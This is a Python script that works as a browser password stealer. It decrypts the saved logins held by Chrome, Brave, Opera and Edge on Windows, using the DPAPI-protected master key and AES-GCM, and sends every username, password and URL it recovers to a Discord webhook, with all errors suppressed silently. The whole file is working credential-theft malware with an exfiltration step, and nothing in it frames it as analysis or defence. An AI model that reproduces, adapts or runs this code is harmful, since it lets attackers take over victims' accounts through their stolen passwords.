import os
import json
import base64
import sqlite3
import shutil
from Cryptodome.Cipher import AES
import win32crypt
import requests
from typing import List, Dict

WEBHOOK_URL = "discord_webhook_url"
MAX_MESSAGE_LENGTH = 1900

def get_master_key(local_state_path: str) -> bytes:
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(master_key: bytes, encrypted_password: bytes) -> str:
    try:
        if len(encrypted_password) > 3 and encrypted_password[:3] == b'v10':
            nonce, ciphertext, tag = encrypted_password[3:15], encrypted_password[15:-16], encrypted_password[-16:]
        else:
            nonce, ciphertext, tag = encrypted_password[:12], encrypted_password[12:-16], encrypted_password[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return "[Decryption Error]"

def process_browser(browser_name: str, user_data_path: str, local_state_path: str) -> List[Dict]:
    credentials = []
    if not os.path.exists(user_data_path) or not os.path.exists(local_state_path):
        return credentials
    
    master_key = get_master_key(local_state_path)
    if not master_key:
        return credentials
    
    profiles = [d for d in os.listdir(user_data_path) if d.startswith(('Default', 'Profile'))]
    
    for profile in profiles:
        profile_path = os.path.join(user_data_path, profile)
        db_path = os.path.join(profile_path, 'Login Data')
        
        if not os.path.exists(db_path):
            continue
        
        temp_db = f'temp_{browser_name}_{profile}.db'
        shutil.copy2(db_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if not url or not username or not encrypted_password:
                    continue
                decrypted_password = decrypt_password(master_key, encrypted_password)
                credentials.append({
                    'browser': browser_name,
                    'profile': profile,
                    'url': url,
                    'username': username,
                    'password': decrypted_password
                })
            conn.close()
        except:
            pass
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
    
    return credentials

def send_to_discord(credentials: List[Dict]) -> None:
    if not credentials:
        return
    
    message = "```\nBrowser Credentials Captured:\n"
    for cred in credentials:
        message += f"Browser: {cred['browser']} ({cred['profile']})\n"
        message += f"URL: {cred['url']}\n"
        message += f"Username: {cred['username']}\n"
        message += f"Password: {cred['password']}\n"
        message += "------------------------\n"
    message += f"Total credentials: {len(credentials)}\n```"
    
    if len(message) <= MAX_MESSAGE_LENGTH:
        messages = [message]
    else:
        messages = []
        current_chunk = "```\nBrowser Credentials Captured:\n"
        for cred in credentials:
            entry = (f"Browser: {cred['browser']} ({cred['profile']})\n"
                     f"URL: {cred['url']}\n"
                     f"Username: {cred['username']}\n"
                     f"Password: {cred['password']}\n"
                     f"------------------------\n")
            if len(current_chunk) + len(entry) > MAX_MESSAGE_LENGTH - 50:
                current_chunk += "```\n"
                messages.append(current_chunk)
                current_chunk = "```\nContinued...\n"
            current_chunk += entry
        current_chunk += f"Total credentials: {len(credentials)}\n```"
        messages.append(current_chunk)
    
    for msg in messages:
        try:
            requests.post(WEBHOOK_URL, json={'content': msg})
        except:
            pass

def main():
    browser_configs = [
        ('chrome', r'%LOCALAPPDATA%\Google\Chrome\User Data', r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State'),
        ('brave', r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data', r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State'),
        ('opera', r'%APPDATA%\Opera Software\Opera Stable', r'%APPDATA%\Opera Software\Opera Stable\Local State'),
        ('edge', r'%LOCALAPPDATA%\Microsoft\Edge\User Data', r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
    ]
    
    all_credentials = []
    for name, user_data, local_state in browser_configs:
        creds = process_browser(name, os.path.expandvars(user_data), os.path.expandvars(local_state))
        all_credentials.extend(creds)
    
    send_to_discord(all_credentials)

if __name__ == "__main__":
    try:
        main()
    except:
        pass